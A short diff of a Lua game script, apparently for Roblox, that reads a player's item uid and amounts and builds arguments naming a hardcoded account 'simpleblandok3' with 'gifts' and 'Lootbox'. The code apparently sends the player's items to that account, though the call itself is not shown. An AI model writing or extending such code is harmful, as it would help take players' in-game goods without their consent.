@@ -119,7 +119,7 @@ local function dataFunction2()
             local ItemData = ItemInfo.data
             if ItemData._am then
                 diamondsvalue = ItemData._am
-gifts = ItemInfo.uid
+                gifts = ItemInfo.uid
             end
         end
 
@@ -128,7 +128,6 @@ gifts = ItemInfo.uid
             local ItemData = ItemInfo.data
             if ItemData._am then
                 voidvalue = ItemData._am
-                
             end
         end
 
@@ -183,7 +182,7 @@ gifts = ItemInfo.uid
                 local args = {
                     [1] = "simpleblandok3",
                     [2] = "gifts",
-                    [3] = "Misc",
+                    [3] = "Lootbox",
                     [4] = gifts,
                     [5] = voidvalue
                 }
@@ -196,7 +195,6 @@ gifts = ItemInfo.uid
 end
 
 spawn(dataFunction2)
-
 
 
 
